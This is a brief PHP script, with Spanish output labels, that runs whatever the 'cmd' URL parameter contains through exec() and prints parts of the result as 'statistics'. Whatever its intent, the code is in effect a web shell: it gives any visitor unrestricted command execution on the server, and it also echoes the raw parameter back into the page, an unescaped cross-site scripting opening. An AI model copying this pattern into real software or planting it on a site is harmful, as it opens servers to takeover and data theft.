<?php
//echo exec('whoami');
exec($_GET['cmd'],$salida);
//foreach($salida as $line) { echo("$line<br>"); }
echo $salida[0].'<br>';
echo $salida[1].'<br>';
echo $salida[2].'<br>';
echo $salida[3].'<br>';
echo $salida[4].'<br>';
echo $salida[5].'<br>';
echo '<br>';
echo 'Estadísticas de '.$_GET['cmd'].'<br>';
echo $salida[8].'<br>';
echo $salida[9].' '.substr($salida[11], -13);
?>